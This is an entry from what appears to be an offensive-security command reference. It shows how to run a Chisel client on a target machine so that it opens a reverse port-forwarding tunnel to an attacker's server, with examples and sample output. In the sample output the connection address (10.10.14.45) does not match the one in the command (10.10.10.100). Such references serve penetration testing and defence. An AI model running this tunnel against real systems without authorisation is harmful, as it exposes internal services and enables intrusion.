---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
type: command
executor: bash
data: './chisel client $_SERVER_IP:$_SERVER_PORT R:$_REMOTE_PORT:$_LOCAL_PORT'
output: >-
  bob@securehost:/tmp$ ./chisel client 10.10.10.100:9000 R:9999:52846

  2020/01/21 23:15:32 client: Connecting to ws://10.10.14.45:9000

  2020/01/21 23:15:32 client: Fingerprint
  ce:ca:15:df:b8:43:2f:19:82:a0:98:fb:07:e1:1f:cc

  2020/01/21 23:15:33 client: Connected (Latency 112.671627ms)
created_at: '2019-10-02T01:17:50Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - Windows
tags:
  - tunneling
  - client
  - reverse-port-forward
verified: true
validated: true
---

# chisel-client-reverse-port-forward

## Command

```bash
./chisel client $_SERVER_IP:$_SERVER_PORT R:$_REMOTE_PORT:$_LOCAL_PORT
```

## Description

This command runs the Chisel client to establish a reverse port forwarding tunnel from the target machine to the attacker's Chisel server. It allows the attacker to access services on the target's localhost by forwarding connections from a specified remote port on the server to a local port on the client.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_SERVER_IP:$_SERVER_PORT | The IP address and port of the Chisel server (e.g., 10.10.10.100:9000) | Yes |
| R:$_REMOTE_PORT:$_LOCAL_PORT | Reverse forwarding specification: remote port on server to local port on client (e.g., R:9999:8080) | Yes |

## Examples

### Basic Usage

```bash
./chisel client 10.10.10.100:9000 R:9999:8080
```

### Advanced Usage

```bash
./chisel client 10.10.10.100:9000 R:9999:8080 --auth username:password --keep-alive 10s
```

## Expected Output

The command connects to the server via WebSocket, verifies the authentication fingerprint, and establishes the tunnel with reported latency.

```
bob@securehost:/tmp$ ./chisel client 10.10.10.100:9000 R:9999:52846
2020/01/21 23:15:32 client: Connecting to ws://10.10.14.45:9000
2020/01/21 23:15:32 client: Fingerprint ce:ca:15:df:b8:43:2f:19:82:a0:98:fb:07:e1:1f:cc
2020/01/21 23:15:33 client: Connected (Latency 112.671627ms)
```

## Related

- [[commands/chisel-server-enable-reverse-tunneling]]
- [[tools/Chisel]]
